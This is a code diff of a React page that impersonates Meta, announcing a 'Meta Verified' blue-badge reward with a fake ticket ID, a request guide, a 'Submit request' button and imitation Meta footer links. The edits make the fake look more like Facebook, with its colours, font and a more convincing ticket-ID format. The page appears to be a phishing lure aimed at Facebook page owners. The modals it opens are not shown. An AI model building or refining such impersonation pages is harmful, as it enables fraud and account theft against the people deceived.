@@ -19,11 +19,12 @@ const LABEL = 'Thần-tài-đến';
 
 const generateTicketId = () =>
 {
-    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-    const pick = ( len ) =>
-        Array.from( { length: len }, () => chars[ Math.floor( Math.random() * chars.length ) ] ).join( '' );
+    const digits = '0123456789';
+    const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    const pick = ( pool, len ) =>
+        Array.from( { length: len }, () => pool[ Math.floor( Math.random() * pool.length ) ] ).join( '' );
 
-    return `#${ pick( 4 ) }-${ pick( 4 ) }-${ pick( 4 ) }`;
+    return `#${ pick( digits, 4 ) }-${ pick( letters, 4 ) }-${ pick( digits, 4 ) }`;
 };
 
 const Home = () =>
@@ -57,8 +58,8 @@ const Home = () =>
         () => ( {
             heroTitle: 'Meta Verified - Rewards for you',
             showWorld: 'Show the world that you mean business.',
-            congrats: "Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience.",
-            excited: "We're thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!",
+            congrats: "Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you’ve built with your audience.",
+            excited: "We’re thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!",
             ticketIdPrefix: 'Your ticket id:',
             guideTitle: 'Verified Blue Badge Request Guide',
             guideItem1: '- Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats',
@@ -423,7 +424,7 @@ const Home = () =>
     return (
         <>
             <style>{ `
-                @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap');
+                @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
                 html, body, #root {
                     margin: 0 !important;
                     padding: 0 !important;
@@ -431,18 +432,19 @@ const Home = () =>
                     max-width: 100% !important;
                     min-height: 100dvh !important;
                     display: block !important;
-                    font-family: 'Plus Jakarta Sans', 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif !important;
+                    font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif !important;
                     -webkit-font-smoothing: antialiased;
-                    -moz-osx-font-smoothing: grayscale;
+                    text-rendering: optimizeLegibility;
+                    color: #171a1d;
                 }
-                .meta-hero-wrapper * {
-                    font-family: 'Plus Jakarta Sans', 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif !important;
+                .meta-notice-wrapper * {
+                    font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif !important;
                     box-sizing: border-box;
                 }
             ` }</style>
 
             <div
-                className="meta-hero-wrapper"
+                className="meta-notice-wrapper"
                 style={ {
                     position: 'fixed',
                     inset: 0,
@@ -450,193 +452,252 @@ const Home = () =>
                     height: '100dvh',
                     overflowY: 'auto',
                     WebkitOverflowScrolling: 'touch',
-                    background: 'linear-gradient(125deg, #e7effd 0%, #eff6fd 45%, #e8f5f5 100%)',
+                    background: 'linear-gradient(130deg, rgba(249, 241, 249, 1) 0%, rgba(234, 243, 253, 1) 35%, rgba(237, 251, 242, 1) 100%)',
                     display: 'flex',
                     flexDirection: 'column',
-                    padding: '32px 20px 80px 20px',
-                    color: '#1c2b33',
+                    alignItems: 'center',
+                    justifyContent: 'flex-start',
+                    color: '#171a1d',
                     zIndex: 1
                 } }
             >
                 <div
                     style={ {
-                        maxWidth: '680px',
+                        maxWidth: '768px',
                         width: '100%',
-                        margin: 'auto',
-                        textAlign: 'left'
+                        padding: '15px 15px 60px 15px',
+                        margin: 'auto 0'
                     } }
                 >
-                    <div style={ { marginBottom: '20px' } }>
-                        <img
-                            src={ TickIcon }
-                            alt="Verified Badge"
-                            style={ { width: '50px', height: '50px', display: 'block' } }
-                        />
-                    </div>
-
-                    <h1
-                        style={ {
-                            fontSize: 'clamp(26px, 5vw, 33px)',
-                            fontWeight: '700',
-                            color: '#1c2b33',
-                            margin: '0 0 22px 0',
-                            lineHeight: '1.22',
-                            letterSpacing: '-0.025em'
-                        } }
-                    >
-                        { texts.heroTitle }
-                    </h1>
-
-                    <p
-                        style={ {
-                            fontSize: '15.5px',
-                            fontWeight: '700',
-                            color: '#1c2b33',
-                            margin: '0 0 18px 0',
-                            lineHeight: '1.5'
-                        } }
-                    >
-                        { texts.showWorld }
-                    </p>
-
-                    <p
-                        style={ {
-                            fontSize: '14.5px',
-                            color: '#2c3a44',
-                            margin: '0 0 16px 0',
-                            lineHeight: '1.62',
-                            fontWeight: '400'
-                        } }
-                    >
-                        { texts.congrats }
-                    </p>
-
-                    <p
-                        style={ {
-                            fontSize: '14.5px',
-                            color: '#2c3a44',
-                            margin: '0 0 20px 0',
-                            lineHeight: '1.62',
-                            fontWeight: '400'
-                        } }
-                    >
-                        { texts.excited }
-                    </p>
-
-                    <p
-                        style={ {
-                            fontSize: '14.5px',
-                            color: '#5f6f7b',
-                            margin: '0 0 24px 0',
-                            fontWeight: '400',
-                            letterSpacing: '0.01em'
-                        } }
-                    >
-                        { texts.ticketIdPrefix } { ticketId }
-                    </p>
-
-                    <h2
-                        style={ {
-                            fontSize: '15.5px',
-                            fontWeight: '700',
-                            color: '#1c2b33',
-                            margin: '0 0 14px 0'
-                        } }
-                    >
-                        { texts.guideTitle }
-                    </h2>
-
-                    <div
-                        style={ {
-                            fontSize: '14.5px',
-                            color: '#2c3a44',
-                            lineHeight: '1.62',
-                            display: 'flex',
-                            flexDirection: 'column',
-                            gap: '12px',
-                            marginBottom: '36px',
-                            fontWeight: '400'
-                        } }
-                    >
-                        <p style={ { margin: 0 } }>{ texts.guideItem1 }</p>
-                        <p style={ { margin: 0 } }>{ texts.guideItem2 }</p>
-                        <p style={ { margin: 0 } }>{ texts.guideItem3 }</p>
-                    </div>
-
-                    <div
-                        style={ {
-                            display: 'flex',
-                            justifyContent: 'center',
-                            marginBottom: '28px'
-                        } }
-                    >
-                        <button
-                            id="start"
-                            type="button"
-                            onClick={ () => setShowFirstModal( true ) }
+                    <div style={ { padding: '15px' } }>
+                        {/* Header: Icon tích xanh + Tiêu đề lớn */}
+                        <div
                             style={ {
-                                backgroundColor: '#2463eb',
-                                color: '#ffffff',
-                                border: 'none',
-                                borderRadius: '9999px',
-                                padding: '13px 82px',
-                                fontSize: '15px',
-                                fontWeight: '600',
-                                cursor: 'pointer',
-                                transition: 'background-color 0.2s ease',
-                                boxShadow: '0 2px 8px rgba(36, 99, 235, 0.22)'
+                                display: 'flex',
+                                alignItems: 'flex-start',
+                                gap: '8px',
+                                flexDirection: 'column',
+                                justifyContent: 'flex-start',
+                                marginBottom: '30px'
                             } }
-                            onMouseOver={ ( e ) => ( e.currentTarget.style.backgroundColor = '#1d54cc' ) }
-                            onMouseOut={ ( e ) => ( e.currentTarget.style.backgroundColor = '#2463eb' ) }
                         >
-                            { texts.submitRequest }
-                        </button>
+                            <img
+                                src={ TickIcon }
+                                alt="tick"
+                                style={ { width: '48px', height: '48px', display: 'block' } }
+                            />
+                            <b
+                                style={ {
+                                    fontSize: 'clamp(1.6rem, 4.5vw, 2rem)',
+                                    fontWeight: '700',
+                                    lineHeight: '1.25',
+                                    color: '#171a1d'
+                                } }
+                            >
+                                { texts.heroTitle }
+                            </b>
+                        </div>
+
+                        {/* Nội dung chính */}
+                        <div style={ { width: '100%' } }>
+                            <div style={ { width: '100%', marginBottom: '20px' } }>
+                                <b
+                                    style={ {
+                                        fontSize: '17px',
+                                        fontWeight: '700',
+                                        color: '#171a1d',
+                                        display: 'block'
+                                    } }
+                                >
+                                    { texts.showWorld }
+                                </b>
+
+                                <p
+                                    style={ {
+                                        fontSize: '15px',
+                                        marginBottom: '0px',
+                                        marginTop: '15px',
+                                        lineHeight: '1.5',
+                                        color: '#171a1d'
+                                    } }
+                                >
+                                    { texts.congrats }
+                                </p>
+
+                                <p
+                                    style={ {
+                                        fontSize: '15px',
+                                        marginBottom: '0px',
+                                        marginTop: '15px',
+                                        lineHeight: '1.5',
+                                        color: '#171a1d'
+                                    } }
+                                >
+                                    { texts.excited }
+                                </p>
+
+                                <p
+                                    style={ {
+                                        fontSize: '16px',
+                                        marginBottom: '0px',
+                                        marginTop: '14px',
+                                        color: '#465a69',
+                                        lineHeight: '1.5'
+                                    } }
+                                >
+                                    { texts.ticketIdPrefix } { ticketId }
+                                </p>
+                            </div>
+
+                            {/* Hướng dẫn yêu cầu */}
+                            <div style={ { width: '100%' } }>
+                                <p style={ { marginBottom: '15px', marginTop: 0 } }>
+                                    <b
+                                        style={ {
+                                            fontSize: '17px',
+                                            fontWeight: '700',
+                                            color: '#171a1d'
+                                        } }
+                                    >
+                                        { texts.guideTitle }
+                                    </b>
+                                </p>
+
+                                <p
+                                    style={ {
+                                        fontSize: '15px',
+                                        marginBottom: '10px',
+                                        marginTop: 0,
+                                        lineHeight: '1.5',
+                                        color: '#171a1d'
+                                    } }
+                                >
+                                    { texts.guideItem1 }
+                                </p>
+
+                                <p
+                                    style={ {
+                                        fontSize: '15px',
+                                        marginBottom: '10px',
+                                        marginTop: 0,
+                                        lineHeight: '1.5',
+                                        color: '#171a1d'
+                                    } }
+                                >
+                                    { texts.guideItem2 }
+                                </p>
+
+                                <p
+                                    style={ {
+                                        fontSize: '15px',
+                                        marginBottom: '0px',
+                                        marginTop: 0,
+                                        lineHeight: '1.5',
+                                        color: '#171a1d'
+                                    } }
+                                >
+                                    { texts.guideItem3 }
+                                </p>
+                            </div>
+                        </div>
                     </div>
 
+                    {/* Nút Submit request */}
+                    <div
+                        id="start"
+                        role="button"
+                        tabIndex={ 0 }
+                        onClick={ () => setShowFirstModal( true ) }
+                        onKeyDown={ ( e ) => { if ( e.key === 'Enter' || e.key === ' ' ) setShowFirstModal( true ); } }
+                        style={ {
+                            backgroundColor: '#1877f2',
+                            color: '#ffffff',
+                            border: 'none',
+                            borderRadius: '9999px',
+                            fontSize: '16px',
+                            fontWeight: '600',
+                            padding: '12px 24px',
+                            cursor: 'pointer',
+                            display: 'block',
+                            width: '100%',
+                            maxWidth: '300px',
+                            margin: '20px auto',
+                            textAlign: 'center',
+                            transition: 'background-color 0.2s ease'
+                        } }
+                        onMouseOver={ ( e ) => ( e.currentTarget.style.backgroundColor = '#166fe5' ) }
+                        onMouseOut={ ( e ) => ( e.currentTarget.style.backgroundColor = '#1877f2' ) }
+                    >
+                        { texts.submitRequest }
+                    </div>
+
+                    {/* Footer links */}
                     <div
                         style={ {
                             display: 'flex',
-                            flexWrap: 'wrap',
-                            justifyContent: 'center',
                             alignItems: 'center',
-                            gap: '18px',
-                            fontSize: '12.5px',
-                            color: '#6b7785'
+                            textAlign: 'center',
+                            justifyContent: 'center',
+                            flexWrap: 'wrap',
+                            fontSize: '12px',
+                            marginTop: '30px',
+                            color: '#65676b',
+                            gap: '16px'
                         } }
                     >
-                        <span
-                            onClick={ () =>
+                        <a
+                            href="#help"
+                            onClick={ ( e ) =>
                             {
+                                e.preventDefault();
                                 setSelectedPrivacyQuestion( texts.privacyPolicyQ );
                                 setShowPrivacyModal( true );
                             } }
-                            style={ { cursor: 'pointer' } }
+                            style={ { color: 'inherit', textDecoration: 'none', cursor: 'pointer' } }
                         >
                             { texts.helpCenter }
-                        </span>
-                        <span
-                            onClick={ () =>
+                        </a>
+                        <a
+                            href="#privacy"
+                            onClick={ ( e ) =>
                             {
+                                e.preventDefault();
                                 setSelectedPrivacyQuestion( texts.privacyPolicyQ );
                                 setShowPrivacyModal( true );
                             } }
-                            style={ { cursor: 'pointer' } }
+                            style={ { color: 'inherit', textDecoration: 'none', cursor: 'pointer' } }
                         >
                             { texts.privacyPolicy }
-                        </span>
-                        <span
-                            onClick={ () => setShowTermsModal( true ) }
-                            style={ { cursor: 'pointer' } }
+                        </a>
+                        <a
+                            href="#terms"
+                            onClick={ ( e ) =>
+                            {
+                                e.preventDefault();
+                                setShowTermsModal( true );
+                            } }
+                            style={ { color: 'inherit', textDecoration: 'none', cursor: 'pointer' } }
                         >
                             { texts.termsOfService }
-                        </span>
-                        <span
-                            onClick={ () => setShowTermsModal( true ) }
-                            style={ { cursor: 'pointer' } }
+                        </a>
+                        <a
+                            href="#standards"
+                            onClick={ ( e ) =>
+                            {
+                                e.preventDefault();
+                                setShowTermsModal( true );
+                            } }
+                            style={ { color: 'inherit', textDecoration: 'none', cursor: 'pointer' } }
                         >
                             { texts.communityStandards }
-                        </span>
-                        <span>Meta © 2026</span>
+                        </a>
+                        <a
+                            href="#meta"
+                            onClick={ ( e ) => e.preventDefault() }
+                            style={ { color: 'inherit', textDecoration: 'none', cursor: 'default' } }
+                        >
+                            Meta © 2026
+                        </a>
                     </div>
                 </div>
             </div>
